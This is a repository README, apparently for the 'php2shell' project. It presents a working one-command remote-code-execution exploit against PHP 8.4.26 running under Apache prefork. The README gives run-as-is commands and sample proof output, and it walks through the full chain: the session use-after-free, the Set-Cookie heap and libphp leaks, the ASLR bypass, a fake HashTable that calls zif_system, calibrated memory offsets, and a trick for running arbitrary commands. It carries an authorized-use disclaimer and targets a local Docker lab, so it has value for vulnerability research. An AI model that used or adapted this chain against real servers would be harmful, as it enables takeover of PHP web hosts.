# php2shell — PHP 8.4.26 session vulnerability reproduction

[中文](README.md) | English

Under the constraints of being fully remote, HTTP-only, with no `session_start()` on the target page and no PHP written on the target side, a single **`exploit.py`** achieves RCE on PHP 8.4.26 + Apache prefork + mod_php. The official `php:8.4.26-apache` image has been tested **3/3** with one-shot success (`PROOF: uid=33(www-data)...`). The current version requires `display_errors=1`; with `display_errors=0` the pure-HTTP heap leak is already working, and the complete RCE will be committed later.

## exp

The complete from-zero-to-RCE command block below can be copied and run as-is. This repository does not compile PHP/Apache and has no `docker build`: the environment is simply the official `php:8.4.26-apache` image plus the config mounts under `docker/`.

```bash
# Requirements: Docker Engine/Desktop + Docker Compose v2 + Python 3.9+
git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) Pull the official image (PHP 8.4.26 / Debian 12 / Apache prefork)
docker compose -f docker/docker-compose.yml pull

# 2) Start the target: single worker, display_errors=On, memory_limit=8M
docker compose -f docker/docker-compose.yml up -d

# 3) Wait for Apache and confirm a normal page
for i in $(seq 1 20); do
  curl -fsS http://127.0.0.1:8088/index.php >/dev/null 2>&1 && break
  sleep 0.5
done
curl -s http://127.0.0.1:8088/index.php   # OK

# 4) One command completes the whole exploit; first run reads libphp offsets automatically
python3 exploit.py -u http://127.0.0.1:8088/index.php
# PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> If you are already inside the repository directory, skip `git clone`/`cd`; `pull` can also be omitted, since `up -d` pulls the image automatically.

`exploit.py` automatically performs worker rotation, the two-stage leak, `zif_system` execution, and proof retrieval, with built-in retries for each stage. Runtime environment:

| Component | Version | Source |
|---|---|---|
| PHP | 8.4.26 (NTS, mod_php) | `php:8.4.26-apache` |
| Base OS | Debian 12 (bookworm) | same as above |
| Apache | 2.4.69 (Debian 12 package in the official image, tested) | same as above |
| MPM | prefork, single worker | [docker/apache.conf](docker/apache.conf) |
| Apache in lab reports | 2.4.68 (original self-built lab, `--profile lab`) | for exact parity, use the 2.4.68 tag of [apache/httpd](https://github.com/apache/httpd) |

Official image repository: [docker-library/php](https://github.com/docker-library/php) (Docker Hub: [`php:8.4.26-apache`](https://hub.docker.com/_/php)); PHP source: [php/php-src](https://github.com/php/php-src) (tag `php-8.4.26`).

On first run it automatically executes [docker/offsets.py](docker/offsets.py): it reads the real offsets of `zif_system` / `zval_ptr_dtor` from `libphp.so` inside the container and writes them to `out/offsets.env`; `exploit.py` loads them automatically, so nothing needs editing after switching or upgrading the official image. The default command is `id>/out/p1` (10 bytes); `/out` in the container is mounted to the repository's `./out`, so the proof lands directly on the host:

```text
[*] target http://127.0.0.1:8088/index.php (cmd='id>/out/p1')
[*] no offsets file; reading libphp symbols from container php2shell-target
zif_system     0x...
zval_ptr_dtor  0x...
[+] chunk base = 0x...
[+] libphp base = 0x...
[*] stage 3: HTDATA=0x... ZIF=0x...
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The command length limit in the payload is **14 bytes**. To run arbitrary commands, write a script into the mounted directory and execute it with `sh</out/c` (8 bytes):

```bash
printf 'id; uname -a > /out/p1\n' > out/c
python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'sh</out/c'
```

Common options: `--profile`, `--cmd`, `--proof-file`, `--fetch`, `--zif-offset`, `--dtor-offset`, `--htdata-offset`, `--no-pre-rotate`, `--retries`. The default profile is `bookworm` (official image); use `--profile ubuntu855` for Ubuntu 26.04 `8.5.4-0ubuntu1.3`; use `--profile lab` for the original lab build. `--offsets-file ''` disables automatic loading; specify `--docker-container` when the container name is not `php2shell-target`.

The full Ubuntu 8.5.4 amd64 calibration, Rosetta notes, and one-shot reproduction are in [UBUNTU855.md](UBUNTU855.md).

The bookworm heap calibration is built in: stage1 filler count **841**; stage2 target array **406**, element value length **16**; stage3 `HTDATA=chunk+0x690d8`, A's pads are 6×(31,31), plus a 32-character valid `Cookie: PHPSESSID` so that B reuses the stale id (`send_cookie=0`), preventing the session's `Set-Cookie` header from overwriting `val.type` at `R0+16`; B uses a 15B carrier to overwrite the reference's `val.value`. The official image's libphp offsets are read automatically as `zif_system=0x465370`, `zval_ptr_dtor=0x65eb60`; the original lab uses `0x43a870` / `0x613c50`.

## Mechanism overview

The vulnerable surface is session initialization triggered by `session.upload_progress` before RINIT, together with a dangling pointer left across requests after an OOM bailout. The lab build is used as the example below; the bookworm calibration values for the official image are at the end of the exp section.

The entire attack traffic is ordinary multipart HTTP; the target page is just `<?php echo "OK\n"; ?>`:

0. **Worker rotation**: `A_bigfields` (3MB live POST field + 12MB OOM) is immediately followed by a B that initializes a session; the child exits with SIGABRT; the new worker forked by prefork inherits the same libphp/chunk mappings.
1. **Heap leak**: A uses 1001 fields to trigger the `max_input_vars` warning (`display_errors=On` → `headers_sent=1`), `PHPSESSID=\x00` generates a new id and sets `send_cookie=1`, and the final 12MB field OOMs inside `php_session_initialize()`, leaving `PS(http_session_vars)` dangling. B reoccupies the old reference with a 56B multipart raw-value buffer, and uses a surviving 192B zend_string to carry a fake HashTable; the out-of-bounds read in `php_url_encode()` writes Zend MM chunk pointers into `Set-Cookie` (4096B, 98 pointers).
2. **libphp leak**: A places the dangling `PS(id)` at `chunk+0xb7400`; B's 56B HashTable page makes `ZSTR_LEN(PS(id))` read `nTableSize=16`, and the data area is exactly `nNextFreeElement|pDestructor`; `pDestructor = ZVAL_PTR_DTOR = libphp+0x613c50`, from which the libphp base is decoded out of `Set-Cookie`.
3. **Command execution**: A uses 6 pads to pin the dangling reference at `R0=chunk+0x24e0`; B overwrites `R0-0x10` with a 55B raw buffer, places the fake HashTable in a 167B surviving string at `chunk+0x6e0d8`, and sets `pDestructor = zif_system = libphp+0x43a870`. Trigger chain:

   ```text
   php_session_track_init()
     zval_ptr_dtor(PS(http_session_vars))
       zend_reference_destroy(R0)
         zval_ptr_dtor(&ref->val)          # IS_ARRAY_EX
           zend_array_destroy(fake HT)
             zend_hash_destroy(fake HT)
               pDestructor(&bucket->val)   # zif_system
   ```

   The terminal stage only uses `zif_system` inside libphp; libc is not needed.

## Mechanism analysis

- **Why the page does not need `session_start()`**: A/B session initialization happens in the multipart callbacks before RINIT (`FILE_START → php_session_rfc1867_update → php_session_initialize()`; `END → php_session_rfc1867_cleanup → php_session_initialize()`), independent of script content.
- **Why the pointer dangles**: A OOM-bails out inside `php_session_initialize()` without clearing `PS(http_session_vars)` / `PS(id)`; when the next request initializes a session, `php_session_track_init()` calls `zval_ptr_dtor` on it.
- **Why reoccupation works**: multipart normal field values are allocated as zend_strings during request parsing; the 56B block, 55B reference, and 167B string sizes line up exactly to cover the old reference and carry the fake HashTable.
- **Why ASLR is bypassed**: the two `Set-Cookie` out-of-bounds reads leak the chunk base and the libphp base; between stages a pure-HTTP abort/fork swaps workers while the address space stays the same; the terminal stage does not depend on libc.
- **Historical line**: Defect D (`arData` UAF) with `session_unset()` + a userland `__destruct` already achieved RCE with a custom PHP page ([NOASLR_REPORT.md](NOASLR_REPORT.md)), but it violates the "no specific PHP" constraint and serves only as a mechanism reference.

Addresses/offsets (relative to chunk or libphp, independent of ASLR):

| Location | Meaning |
|---|---|
| `chunk+0xb7400` | stage 2 dangling `PS(id)` |
| `chunk+0xb73f0` | stage 2 target HashTable (`a0443`) |
| `chunk+0x6e0d8` | stage 3 fake HashTable string data |
| `chunk+0x24e0` | stage 3 dangling reference `R0` |
| `libphp+0x613c50` | `ZVAL_PTR_DTOR` |
| `libphp+0x43a870` | `zif_system` |

The table above is for the lab build (`--profile lab`). The corresponding calibration for the official image (default `--profile bookworm`) is: stage1 filler count **841**; stage2 target array **406**, element value length **16**; stage3 `HTDATA=chunk+0x690d8`, A pads 6×(31,31) with a 32-character valid `Cookie: PHPSESSID`, B uses a 15B carrier; libphp offsets are read automatically by `docker/offsets.py` (`0x465370` / `0x65eb60`).

Detailed mechanisms, gdb evidence, and request calibration: [HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md) (heap leak), [ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md) (libphp leak and full chain), [DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md) (leak without relying on `display_errors`), [NOTES.md](NOTES.md) (root cause and source locations).

## Reproduction statement

- **One exp reproduces everything**: `python3 exploit.py -u ...` completes worker rotation, heap leak, libphp leak, and `zif_system` execution in a single command; no target-side files, no `session_start()`, no local signals.
- **HTTP only**: attack traffic is only multipart POST; the target webroot contains only `<?php echo "OK\n"; ?>`.
- **Environment**: official `php:8.4.26-apache` (PHP 8.4.26 / Debian 12 / Apache 2.4.69 prefork) + [docker/php.ini](docker/php.ini), [docker/apache.conf](docker/apache.conf), default `--profile bookworm`, tested **3/3**. The original lab build (Apache 2.4.68, minimal PHP) uses `--profile lab`; chunk offsets and stage3 trigger paths have been calibrated separately for both profiles.
- **Boundaries**: the current RCE requires `display_errors=1`, `memory_limit=8M`, `max_input_vars=1000`, `session.use_cookies=1`, `session.use_strict_mode=0`, and a single-worker prefork setup; full RCE with `display_errors=0` will be committed later.
- For vulnerability research and reproduction in authorized environments only.
